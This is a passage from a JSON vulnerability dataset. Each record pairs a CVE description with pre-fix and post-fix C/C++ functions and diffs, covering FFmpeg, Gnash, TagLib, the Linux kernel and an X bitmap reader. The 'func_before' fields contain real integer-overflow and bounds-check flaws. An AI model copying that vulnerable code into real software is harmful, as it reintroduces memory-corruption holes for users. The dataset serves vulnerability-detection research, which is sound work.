(line,\"static unsigned char %s = {\",name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf (line, \"static const char %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf (line, \"static char %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse\n\t\t\tcontinue;\n\n\t\tif (!(type = strrchr (name_and_type, '_')))\n\t\t\ttype = name_and_type;\n\t\telse\n\t\t\ttype++;\n\n\t\tif (strcmp (\"bits[]\", type))\n\t\t\tcontinue;\n    \n\t\tif (!ww || !hh)\n\t\t\tRETURN (FALSE);\n\n\t\tif ((ww % 16) && ((ww % 16) < 9) && version10p)\n\t\t\tpadding = 1;\n\t\telse\n\t\t\tpadding = 0;\n\n\t\tbytes_per_line = (ww+7)/8 + padding;\n\n\t\tsize = bytes_per_line * hh;\n                if (size / bytes_per_line != hh) /* overflow */\n                        RETURN (FALSE);\n\t\tbits = g_malloc (size);\n\n\t\tif (version10p) {\n\t\t\tunsigned char *ptr;\n\t\t\tint bytes;\n\n\t\t\tfor (bytes = 0, ptr = bits; bytes < size; (bytes += 2)) {\n\t\t\t\tif ((value = next_int (fstream)) < 0)\n\t\t\t\t\tRETURN (FALSE);\n\t\t\t\t*(ptr++) = value;\n\t\t\t\tif (!padding || ((bytes+2) % bytes_per_line))\n\t\t\t\t\t*(ptr++) = value >> 8;\n\t\t\t}\n\t\t} else {\n\t\t\tunsigned char *ptr;\n\t\t\tint bytes;\n\n\t\t\tfor (bytes = 0, ptr = bits; bytes < size; bytes++, ptr++) {\n\t\t\t\tif ((value = next_int (fstream)) < 0) \n\t\t\t\t\tRETURN (FALSE);\n\t\t\t\t*ptr=value;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n\tif (!bits)\n\t\tRETURN (FALSE);\n\n\t*data = bits;\n\t*width = ww;\n\t*height = hh;\n\tif (x_hot)\n\t\t*x_hot = hx;\n\tif (y_hot)\n\t\t*y_hot = hy;\n\n\treturn TRUE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -38,10 +38,16 @@\n \t\t\t\ttype++;\n \t\t\t}\n \n-\t\t\tif (!strcmp (\"width\", type))\n+\t\t\tif (!strcmp (\"width\", type)) {\n+                                if (value <= 0)\n+                                        RETURN (FALSE);\n \t\t\t\tww = (unsigned int) value;\n-\t\t\tif (!strcmp (\"height\", type))\n+                        }\n+\t\t\tif (!strcmp (\"height\", type)) {\n+                                if (value <= 0)\n+                                        RETURN (FALSE);\n \t\t\t\thh = (unsigned int) value;\n+                        }\n \t\t\tif (!strcmp (\"hot\", type)) {\n \t\t\t\tif (type-- == name_and_type\n \t\t\t\t    || type-- == name_and_type)\n@@ -86,6 +92,8 @@\n \t\tbytes_per_line = (ww+7)/8 + padding;\n \n \t\tsize = bytes_per_line * hh;\n+                if (size / bytes_per_line != hh) /* overflow */\n+                        RETURN (FALSE);\n \t\tbits = g_malloc (size);\n \n \t\tif (version10p) {",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tif (!strcmp (\"width\", type))",
                "\t\t\tif (!strcmp (\"height\", type))"
            ],
            "added_lines": [
                "\t\t\tif (!strcmp (\"width\", type)) {",
                "                                if (value <= 0)",
                "                                        RETURN (FALSE);",
                "                        }",
                "\t\t\tif (!strcmp (\"height\", type)) {",
                "                                if (value <= 0)",
                "                                        RETURN (FALSE);",
                "                        }",
                "                if (size / bytes_per_line != hh) /* overflow */",
                "                        RETURN (FALSE);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4352",
        "func_name": "ffmpeg/vp3_dequant",
        "description": "Integer overflow in the vp3_dequant function in the VP3 decoder (vp3.c) in libavcodec in FFmpeg 0.5.x before 0.5.7, 0.6.x before 0.6.4, 0.7.x before 0.7.9, and 0.8.x before 0.8.8; and in Libav 0.5.x before 0.5.6, 0.6.x before 0.6.4, and 0.7.x before 0.7.3 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted VP3 stream, which triggers a buffer overflow.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=eef5c35b4352ec49ca41f6198bee8a976b1f81e5",
        "commit_title": "",
        "commit_text": "vp3dec: Check coefficient index in vp3_dequant() Fixes NGS00145  ",
        "func_before": "static inline int vp3_dequant(Vp3DecodeContext *s, Vp3Fragment *frag,\n                              int plane, int inter, DCTELEM block[64])\n{\n    int16_t *dequantizer = s->qmat[frag->qpi][inter][plane];\n    uint8_t *perm = s->scantable.permutated;\n    int i = 0;\n\n    do {\n        int token = *s->dct_tokens[plane][i];\n        switch (token & 3) {\n        case 0: // EOB\n            if (--token < 4) // 0-3 are token types, so the EOB run must now be 0\n                s->dct_tokens[plane][i]++;\n            else\n                *s->dct_tokens[plane][i] = token & ~3;\n            goto end;\n        case 1: // zero run\n            s->dct_tokens[plane][i]++;\n            i += (token >> 2) & 0x7f;\n            block[perm[i]] = (token >> 9) * dequantizer[perm[i]];\n            i++;\n            break;\n        case 2: // coeff\n            block[perm[i]] = (token >> 2) * dequantizer[perm[i]];\n            s->dct_tokens[plane][i++]++;\n            break;\n        default: // shouldn't happen\n            return i;\n        }\n    } while (i < 64);\nend:\n    // the actual DC+prediction is in the fragment structure\n    block[0] = frag->dc * s->qmat[0][inter][plane][0];\n    return i;\n}",
        "func": "static inline int vp3_dequant(Vp3DecodeContext *s, Vp3Fragment *frag,\n                              int plane, int inter, DCTELEM block[64])\n{\n    int16_t *dequantizer = s->qmat[frag->qpi][inter][plane];\n    uint8_t *perm = s->scantable.permutated;\n    int i = 0;\n\n    do {\n        int token = *s->dct_tokens[plane][i];\n        switch (token & 3) {\n        case 0: // EOB\n            if (--token < 4) // 0-3 are token types, so the EOB run must now be 0\n                s->dct_tokens[plane][i]++;\n            else\n                *s->dct_tokens[plane][i] = token & ~3;\n            goto end;\n        case 1: // zero run\n            s->dct_tokens[plane][i]++;\n            i += (token >> 2) & 0x7f;\n            if(i>63){\n                av_log(s->avctx, AV_LOG_ERROR, \"Coefficient index overflow\\n\");\n                return -1;\n            }\n            block[perm[i]] = (token >> 9) * dequantizer[perm[i]];\n            i++;\n            break;\n        case 2: // coeff\n            block[perm[i]] = (token >> 2) * dequantizer[perm[i]];\n            s->dct_tokens[plane][i++]++;\n            break;\n        default: // shouldn't happen\n            return i;\n        }\n    } while (i < 64);\nend:\n    // the actual DC+prediction is in the fragment structure\n    block[0] = frag->dc * s->qmat[0][inter][plane][0];\n    return i;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,6 +17,10 @@\n         case 1: // zero run\n             s->dct_tokens[plane][i]++;\n             i += (token >> 2) & 0x7f;\n+            if(i>63){\n+                av_log(s->avctx, AV_LOG_ERROR, \"Coefficient index overflow\\n\");\n+                return -1;\n+            }\n             block[perm[i]] = (token >> 9) * dequantizer[perm[i]];\n             i++;\n             break;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "            if(i>63){",
                "                av_log(s->avctx, AV_LOG_ERROR, \"Coefficient index overflow\\n\");",
                "                return -1;",
                "            }"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-1175",
        "func_name": "gnash/GnashImage::GnashImage",
        "description": "Integer overflow in the GnashImage::size method in libbase/GnashImage.h in GNU Gnash 0.8.10 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted SWF file, which triggers a heap-based buffer overflow.",
        "git_url": "http://git.savannah.gnu.org/cgit/gnash.git/commit/?id=bb4dc77eecb6ed1b967e3ecbce3dac6c5e6f1527",
        "commit_title": "",
        "commit_text": "",
        "func_before": "GnashImage::GnashImage(iterator data, size_t width, size_t height,\n        ImageType type, ImageLocation location)\n    :\n    _type(type),\n    _location(location),\n    _width(width),\n    _height(height),\n    _data(data)\n{\n}",
        "func": "GnashImage::GnashImage(iterator data, size_t width, size_t height,\n        ImageType type, ImageLocation location)\n    :\n    _type(type),\n    _location(location),\n    _width(width),\n    _height(height),\n    _data(data)\n{\n    // Callers should check dimensions\n    assert(checkValidSize(_width, _height, channels()));\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,4 +7,6 @@\n     _height(height),\n     _data(data)\n {\n+    // Callers should check dimensions\n+    assert(checkValidSize(_width, _height, channels()));\n }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    // Callers should check dimensions",
                "    assert(checkValidSize(_width, _height, channels()));"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-1175",
        "func_name": "gnash/GnashImage::GnashImage",
        "description": "Integer overflow in the GnashImage::size method in libbase/GnashImage.h in GNU Gnash 0.8.10 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted SWF file, which triggers a heap-based buffer overflow.",
        "git_url": "http://git.savannah.gnu.org/cgit/gnash.git/commit/?id=bb4dc77eecb6ed1b967e3ecbce3dac6c5e6f1527",
        "commit_title": "",
        "commit_text": "",
        "func_before": "GnashImage::GnashImage(size_t width, size_t height, ImageType type,\n        ImageLocation location)\n    :\n    _type(type),\n    _location(location),\n    _width(width),\n    _height(height)\n{\n    const size_t max = std::numeric_limits<boost::int32_t>::max();\n    if (size() > max) {\n        throw std::bad_alloc();\n    }\n    _data.reset(new value_type[size()]);\n}",
        "func": "GnashImage::GnashImage(size_t width, size_t height, ImageType type,\n        ImageLocation location)\n    :\n    _type(type),\n    _location(location),\n    _width(width),\n    _height(height)\n{\n    // Constructed from external input, so restrict dimensions to avoid\n    // overflow in size calculations\n    if (!checkValidSize(_width, _height, channels())) {\n        throw std::bad_alloc();\n    }\n    _data.reset(new value_type[size()]);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,8 +6,9 @@\n     _width(width),\n     _height(height)\n {\n-    const size_t max = std::numeric_limits<boost::int32_t>::max();\n-    if (size() > max) {\n+    // Constructed from external input, so restrict dimensions to avoid\n+    // overflow in size calculations\n+    if (!checkValidSize(_width, _height, channels())) {\n         throw std::bad_alloc();\n     }\n     _data.reset(new value_type[size()]);",
        "diff_line_info": {
            "deleted_lines": [
                "    const size_t max = std::numeric_limits<boost::int32_t>::max();",
                "    if (size() > max) {"
            ],
            "added_lines": [
                "    // Constructed from external input, so restrict dimensions to avoid",
                "    // overflow in size calculations",
                "    if (!checkValidSize(_width, _height, channels())) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-0849",
        "func_name": "ffmpeg/ff_j2k_dwt_init",
        "description": "Integer overflow in the ff_j2k_dwt_init function in libavcodec/j2k_dwt.c in FFmpeg before 0.9.1 allows remote attackers to cause a denial of service (segmentation fault and application crash) via a crafted JPEG2000 image that triggers an incorrect check for a negative value.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=1f99939a6361e2e6d6788494dd7c682b051c6c34",
        "commit_title": "",
        "commit_text": "j2kdec: Fix integer overflow leading to a segfault Fixes Ticket776 Bug found by: Diana Elena Muscalu  ",
        "func_before": "int ff_j2k_dwt_init(DWTContext *s, uint16_t border[2][2], int decomp_levels, int type)\n{\n    int i, j, lev = decomp_levels, maxlen,\n        b[2][2];\n\n    if (decomp_levels >= FF_DWT_MAX_DECLVLS)\n        return AVERROR_INVALIDDATA;\n    s->ndeclevels = decomp_levels;\n    s->type = type;\n\n    for (i = 0; i < 2; i++)\n        for(j = 0; j < 2; j++)\n            b[i][j] = border[i][j];\n\n    maxlen = FFMAX(b[0][1] - b[0][0],\n                   b[1][1] - b[1][0]);\n\n    while(--lev >= 0){\n        for (i = 0; i < 2; i++){\n            s->linelen[lev][i] = b[i][1] - b[i][0];\n            s->mod[lev][i] = b[i][0] & 1;\n            for (j = 0; j < 2; j++)\n                b[i][j] = (b[i][j] + 1) >> 1;\n        }\n    }\n    if (type == FF_DWT97)\n        s->linebuf = av_malloc((maxlen + 12) * sizeof(float));\n    else if (type == FF_DWT53)\n        s->linebuf = av_malloc((maxlen + 6) * sizeof(int));\n    else\n        return -1;\n\n    if (!s->linebuf)\n        return AVERROR(ENOMEM);\n\n    return 0;\n}",
        "func": "int ff_j2k_dwt_init(DWTContext *s, uint16_t border[2][2], int decomp_levels, int type)\n{\n    int i, j, lev = decomp_levels, maxlen,\n        b[2][2];\n\n    if ((unsigned)decomp_levels >= FF_DWT_MAX_DECLVLS)\n        return AVERROR_INVALIDDATA;\n    s->ndeclevels = decomp_levels;\n    s->type = type;\n\n    for (i = 0; i < 2; i++)\n        for(j = 0; j < 2; j++)\n            b[i][j] = border[i][j];\n\n    maxlen = FFMAX(b[0][1] - b[0][0],\n                   b[1][1] - b[1][0]);\n\n    while(--lev >= 0){\n        for (i = 0; i < 2; i++){\n            s->linelen[lev][i] = b[i][1] - b[i][0];\n            s->mod[lev][i] = b[i][0] & 1;\n            for (j = 0; j < 2; j++)\n                b[i][j] = (b[i][j] + 1) >> 1;\n        }\n    }\n    if (type == FF_DWT97)\n        s->linebuf = av_malloc((maxlen + 12) * sizeof(float));\n    else if (type == FF_DWT53)\n        s->linebuf = av_malloc((maxlen + 6) * sizeof(int));\n    else\n        return -1;\n\n    if (!s->linebuf)\n        return AVERROR(ENOMEM);\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n     int i, j, lev = decomp_levels, maxlen,\n         b[2][2];\n \n-    if (decomp_levels >= FF_DWT_MAX_DECLVLS)\n+    if ((unsigned)decomp_levels >= FF_DWT_MAX_DECLVLS)\n         return AVERROR_INVALIDDATA;\n     s->ndeclevels = decomp_levels;\n     s->type = type;",
        "diff_line_info": {
            "deleted_lines": [
                "    if (decomp_levels >= FF_DWT_MAX_DECLVLS)"
            ],
            "added_lines": [
                "    if ((unsigned)decomp_levels >= FF_DWT_MAX_DECLVLS)"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-1584",
        "func_name": "taglib/ByteVector::mid",
        "description": "Integer overflow in the mid function in toolkit/tbytevector.cpp in TagLib 1.7 and earlier allows context-dependent attackers to cause a denial of service (application crash) via a crafted file header field in a media file, which triggers a large memory allocation.",
        "git_url": "https://github.com/taglib/taglib/commit/dcdf4fd954e3213c355746fa15b7480461972308",
        "commit_title": "Avoid uint overflow in case the length + index is over UINT_MAX",
        "commit_text": "",
        "func_before": "ByteVector ByteVector::mid(uint index, uint length) const\n{\n  ByteVector v;\n\n  if(index > size())\n    return v;\n\n  ConstIterator endIt;\n\n  if(length < 0xffffffff && length + index < size())\n    endIt = d->data.begin() + index + length;\n  else\n    endIt = d->data.end();\n\n  v.d->data.insert(v.d->data.begin(), ConstIterator(d->data.begin() + index), endIt);\n  v.d->size = v.d->data.size();\n\n  return v;\n}",
        "func": "ByteVector ByteVector::mid(uint index, uint length) const\n{\n  ByteVector v;\n\n  if(index > size())\n    return v;\n\n  ConstIterator endIt;\n\n  if(length < size() - index)\n    endIt = d->data.begin() + index + length;\n  else\n    endIt = d->data.end();\n\n  v.d->data.insert(v.d->data.begin(), ConstIterator(d->data.begin() + index), endIt);\n  v.d->size = v.d->data.size();\n\n  return v;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,7 @@\n \n   ConstIterator endIt;\n \n-  if(length < 0xffffffff && length + index < size())\n+  if(length < size() - index)\n     endIt = d->data.begin() + index + length;\n   else\n     endIt = d->data.end();",
        "diff_line_info": {
            "deleted_lines": [
                "  if(length < 0xffffffff && length + index < size())"
            ],
            "added_lines": [
                "  if(length < size() - index)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/do_adjtimex",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "int do_adjtimex(struct timex *txc)\n{\n\tlong mtemp, save_adjust, rem;\n\ts64 freq_adj;\n\tint result;\n\n\t/* In order to modify anything, you gotta be super-user! */\n\tif (txc->modes && !capable(CAP_SYS_TIME))\n\t\treturn -EPERM;\n\n\t/* Now we validate the data before disabling interrupts */\n\n\tif ((txc->modes & ADJ_OFFSET_SINGLESHOT) == ADJ_OFFSET_SINGLESHOT) {\n\t  /* singleshot must not be used with any other mode bits */\n\t\tif (txc->modes != ADJ_OFFSET_SINGLESHOT &&\n\t\t\t\t\ttxc->modes != ADJ_OFFSET_SS_READ)\n\t\t\treturn -EINVAL;\n\t}\n\n\tif (txc->modes != ADJ_OFFSET_SINGLESHOT && (txc->modes & ADJ_OFFSET))\n\t  /* adjustment Offset limited to +- .512 seconds */\n\t\tif (txc->offset <= - MAXPHASE || txc->offset >= MAXPHASE )\n\t\t\treturn -EINVAL;\n\n\t/* if the quartz is off by more than 10% something is VERY wrong ! */\n\tif (txc->modes & ADJ_TICK)\n\t\tif (txc->tick <  900000/USER_HZ ||\n\t\t    txc->tick > 1100000/USER_HZ)\n\t\t\treturn -EINVAL;\n\n\twrite_seqlock_irq(&xtime_lock);\n\tresult = time_state;\t/* mostly `TIME_OK' */\n\n\t/* Save for later - semantics of adjtime is to return old value */\n\tsave_adjust = time_adjust;\n\n#if 0\t/* STA_CLOCKERR is never set yet */\n\ttime_status &= ~STA_CLOCKERR;\t\t/* reset STA_CLOCKERR */\n#endif\n\t/* If there are input parameters, then process them */\n\tif (txc->modes)\n\t{\n\t    if (txc->modes & ADJ_STATUS)\t/* only set allowed bits */\n\t\ttime_status =  (txc->status & ~STA_RONLY) |\n\t\t\t      (time_status & STA_RONLY);\n\n\t    if (txc->modes & ADJ_FREQUENCY) {\t/* p. 22 */\n\t\tif (txc->freq > MAXFREQ || txc->freq < -MAXFREQ) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_freq = ((s64)txc->freq * NSEC_PER_USEC)\n\t\t\t\t>> (SHIFT_USEC - SHIFT_NSEC);\n\t    }\n\n\t    if (txc->modes & ADJ_MAXERROR) {\n\t\tif (txc->maxerror < 0 || txc->maxerror >= NTP_PHASE_LIMIT) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_maxerror = txc->maxerror;\n\t    }\n\n\t    if (txc->modes & ADJ_ESTERROR) {\n\t\tif (txc->esterror < 0 || txc->esterror >= NTP_PHASE_LIMIT) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_esterror = txc->esterror;\n\t    }\n\n\t    if (txc->modes & ADJ_TIMECONST) {\t/* p. 24 */\n\t\tif (txc->constant < 0) {\t/* NTP v4 uses values > 6 */\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_constant = min(txc->constant + 4, (long)MAXTC);\n\t    }\n\n\t    if (txc->modes & ADJ_OFFSET) {\t/* values checked earlier */\n\t\tif (txc->modes == ADJ_OFFSET_SINGLESHOT) {\n\t\t    /* adjtime() is independent from ntp_adjtime() */\n\t\t    time_adjust = txc->offset;\n\t\t}\n\t\telse if (time_status & STA_PLL) {\n\t\t    time_offset = txc->offset * NSEC_PER_USEC;\n\n\t\t    /*\n\t\t     * Scale the phase adjustment and\n\t\t     * clamp to the operating range.\n\t\t     */\n\t\t    time_offset = min(time_offset, (s64)MAXPHASE * NSEC_PER_USEC);\n\t\t    time_offset = max(time_offset, (s64)-MAXPHASE * NSEC_PER_USEC);\n\n\t\t    /*\n\t\t     * Select whether the frequency is to be controlled\n\t\t     * and in which mode (PLL or FLL). Clamp to the operating\n\t\t     * range. Ugly multiply/divide should be replaced someday.\n\t\t     */\n\n\t\t    if (time_status & STA_FREQHOLD || time_reftime == 0)\n\t\t        time_reftime = xtime.tv_sec;\n\t\t    mtemp = xtime.tv_sec - time_reftime;\n\t\t    time_reftime = xtime.tv_sec;\n\n\t\t    freq_adj = time_offset * mtemp;\n\t\t    freq_adj = shift_right(freq_adj, time_constant * 2 +\n\t\t\t\t\t   (SHIFT_PLL + 2) * 2 - SHIFT_NSEC);\n\t\t    if (mtemp >= MINSEC && (time_status & STA_FLL || mtemp > MAXSEC))\n\t\t\tfreq_adj += div_s64(time_offset << (SHIFT_NSEC - SHIFT_FLL), mtemp);\n\t\t    freq_adj += time_freq;\n\t\t    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);\n\t\t    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);\n\t\t    time_offset = div_long_long_rem_signed(time_offset,\n\t\t\t\t\t\t\t   NTP_INTERVAL_FREQ,\n\t\t\t\t\t\t\t   &rem);\n\t\t    time_offset <<= SHIFT_UPDATE;\n\t\t} /* STA_PLL */\n\t    } /* txc->modes & ADJ_OFFSET */\n\t    if (txc->modes & ADJ_TICK)\n\t\ttick_usec = txc->tick;\n\n\t    if (txc->modes & (ADJ_TICK|ADJ_FREQUENCY|ADJ_OFFSET))\n\t\t    ntp_update_frequency();\n\t} /* txc->modes */\nleave:\tif ((time_status & (STA_UNSYNC|STA_CLOCKERR)) != 0)\n\t\tresult = TIME_ERROR;\n\n\tif ((txc->modes == ADJ_OFFSET_SINGLESHOT) ||\n\t\t\t(txc->modes == ADJ_OFFSET_SS_READ))\n\t\ttxc->offset = save_adjust;\n\telse\n\t\ttxc->offset = ((long)shift_right(time_offset, SHIFT_UPDATE)) *\n\t    \t\t\tNTP_INTERVAL_FREQ / 1000;\n\ttxc->freq\t   = (time_freq / NSEC_PER_USEC) <<\n\t\t\t\t(SHIFT_USEC - SHIFT_NSEC);\n\ttxc->maxerror\t   = time_maxerror;\n\ttxc->esterror\t   = time_esterror;\n\ttxc->status\t   = time_status;\n\ttxc->constant\t   = time_constant;\n\ttxc->precision\t   = 1;\n\ttxc->tolerance\t   = MAXFREQ;\n\ttxc->tick\t   = tick_usec;\n\n\t/* PPS is not implemented, so these are zero */\n\ttxc->ppsfreq\t   = 0;\n\ttxc->jitter\t   = 0;\n\ttxc->shift\t   = 0;\n\ttxc->stabil\t   = 0;\n\ttxc->jitcnt\t   = 0;\n\ttxc->calcnt\t   = 0;\n\ttxc->errcnt\t   = 0;\n\ttxc->stbcnt\t   = 0;\n\twrite_sequnlock_irq(&xtime_lock);\n\tdo_gettimeofday(&txc->time);\n\tnotify_cmos_timer();\n\treturn(result);\n}",
        "func": "int do_adjtimex(struct timex *txc)\n{\n\tlong mtemp, save_adjust;\n\ts64 freq_adj;\n\tint result;\n\n\t/* In order to modify anything, you gotta be super-user! */\n\tif (txc->modes && !capable(CAP_SYS_TIME))\n\t\treturn -EPERM;\n\n\t/* Now we validate the data before disabling interrupts */\n\n\tif ((txc->modes & ADJ_OFFSET_SINGLESHOT) == ADJ_OFFSET_SINGLESHOT) {\n\t  /* singleshot must not be used with any other mode bits */\n\t\tif (txc->modes != ADJ_OFFSET_SINGLESHOT &&\n\t\t\t\t\ttxc->modes != ADJ_OFFSET_SS_READ)\n\t\t\treturn -EINVAL;\n\t}\n\n\tif (txc->modes != ADJ_OFFSET_SINGLESHOT && (txc->modes & ADJ_OFFSET))\n\t  /* adjustment Offset limited to +- .512 seconds */\n\t\tif (txc->offset <= - MAXPHASE || txc->offset >= MAXPHASE )\n\t\t\treturn -EINVAL;\n\n\t/* if the quartz is off by more than 10% something is VERY wrong ! */\n\tif (txc->modes & ADJ_TICK)\n\t\tif (txc->tick <  900000/USER_HZ ||\n\t\t    txc->tick > 1100000/USER_HZ)\n\t\t\treturn -EINVAL;\n\n\twrite_seqlock_irq(&xtime_lock);\n\tresult = time_state;\t/* mostly `TIME_OK' */\n\n\t/* Save for later - semantics of adjtime is to return old value */\n\tsave_adjust = time_adjust;\n\n#if 0\t/* STA_CLOCKERR is never set yet */\n\ttime_status &= ~STA_CLOCKERR;\t\t/* reset STA_CLOCKERR */\n#endif\n\t/* If there are input parameters, then process them */\n\tif (txc->modes)\n\t{\n\t    if (txc->modes & ADJ_STATUS)\t/* only set allowed bits */\n\t\ttime_status =  (txc->status & ~STA_RONLY) |\n\t\t\t      (time_status & STA_RONLY);\n\n\t    if (txc->modes & ADJ_FREQUENCY) {\t/* p. 22 */\n\t\tif (txc->freq > MAXFREQ || txc->freq < -MAXFREQ) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_freq = ((s64)txc->freq * NSEC_PER_USEC)\n\t\t\t\t>> (SHIFT_USEC - SHIFT_NSEC);\n\t    }\n\n\t    if (txc->modes & ADJ_MAXERROR) {\n\t\tif (txc->maxerror < 0 || txc->maxerror >= NTP_PHASE_LIMIT) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_maxerror = txc->maxerror;\n\t    }\n\n\t    if (txc->modes & ADJ_ESTERROR) {\n\t\tif (txc->esterror < 0 || txc->esterror >= NTP_PHASE_LIMIT) {\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_esterror = txc->esterror;\n\t    }\n\n\t    if (txc->modes & ADJ_TIMECONST) {\t/* p. 24 */\n\t\tif (txc->constant < 0) {\t/* NTP v4 uses values > 6 */\n\t\t    result = -EINVAL;\n\t\t    goto leave;\n\t\t}\n\t\ttime_constant = min(txc->constant + 4, (long)MAXTC);\n\t    }\n\n\t    if (txc->modes & ADJ_OFFSET) {\t/* values checked earlier */\n\t\tif (txc->modes == ADJ_OFFSET_SINGLESHOT) {\n\t\t    /* adjtime() is independent from ntp_adjtime() */\n\t\t    time_adjust = txc->offset;\n\t\t}\n\t\telse if (time_status & STA_PLL) {\n\t\t    time_offset = txc->offset * NSEC_PER_USEC;\n\n\t\t    /*\n\t\t     * Scale the phase adjustment and\n\t\t     * clamp to the operating range.\n\t\t     */\n\t\t    time_offset = min(time_offset, (s64)MAXPHASE * NSEC_PER_USEC);\n\t\t    time_offset = max(time_offset, (s64)-MAXPHASE * NSEC_PER_USEC);\n\n\t\t    /*\n\t\t     * Select whether the frequency is to be controlled\n\t\t     * and in which mode (PLL or FLL). Clamp to the operating\n\t\t     * range. Ugly multiply/divide should be replaced someday.\n\t\t     */\n\n\t\t    if (time_status & STA_FREQHOLD || time_reftime == 0)\n\t\t        time_reftime = xtime.tv_sec;\n\t\t    mtemp = xtime.tv_sec - time_reftime;\n\t\t    time_reftime = xtime.tv_sec;\n\n\t\t    freq_adj = time_offset * mtemp;\n\t\t    freq_adj = shift_right(freq_adj, time_constant * 2 +\n\t\t\t\t\t   (SHIFT_PLL + 2) * 2 - SHIFT_NSEC);\n\t\t    if (mtemp >= MINSEC && (time_status & STA_FLL || mtemp > MAXSEC))\n\t\t\tfreq_adj += div_s64(time_offset << (SHIFT_NSEC - SHIFT_FLL), mtemp);\n\t\t    freq_adj += time_freq;\n\t\t    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);\n\t\t    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);\n\t\t    time_offset = div_s64(time_offset, NTP_INTERVAL_FREQ);\n\t\t    time_offset <<= SHIFT_UPDATE;\n\t\t} /* STA_PLL */\n\t    } /* txc->modes & ADJ_OFFSET */\n\t    if (txc->modes & ADJ_TICK)\n\t\ttick_usec = txc->tick;\n\n\t    if (txc->modes & (ADJ_TICK|ADJ_FREQUENCY|ADJ_OFFSET))\n\t\t    ntp_update_frequency();\n\t} /* txc->modes */\nleave:\tif ((time_status & (STA_UNSYNC|STA_CLOCKERR)) != 0)\n\t\tresult = TIME_ERROR;\n\n\tif ((txc->modes == ADJ_OFFSET_SINGLESHOT) ||\n\t\t\t(txc->modes == ADJ_OFFSET_SS_READ))\n\t\ttxc->offset = save_adjust;\n\telse\n\t\ttxc->offset = ((long)shift_right(time_offset, SHIFT_UPDATE)) *\n\t    \t\t\tNTP_INTERVAL_FREQ / 1000;\n\ttxc->freq\t   = (time_freq / NSEC_PER_USEC) <<\n\t\t\t\t(SHIFT_USEC - SHIFT_NSEC);\n\ttxc->maxerror\t   = time_maxerror;\n\ttxc->esterror\t   = time_esterror;\n\ttxc->status\t   = time_status;\n\ttxc->constant\t   = time_constant;\n\ttxc->precision\t   = 1;\n\ttxc->tolerance\t   = MAXFREQ;\n\ttxc->tick\t   = tick_usec;\n\n\t/* PPS is not implemented, so these are zero */\n\ttxc->ppsfreq\t   = 0;\n\ttxc->jitter\t   = 0;\n\ttxc->shift\t   = 0;\n\ttxc->stabil\t   = 0;\n\ttxc->jitcnt\t   = 0;\n\ttxc->calcnt\t   = 0;\n\ttxc->errcnt\t   = 0;\n\ttxc->stbcnt\t   = 0;\n\twrite_sequnlock_irq(&xtime_lock);\n\tdo_gettimeofday(&txc->time);\n\tnotify_cmos_timer();\n\treturn(result);\n}",
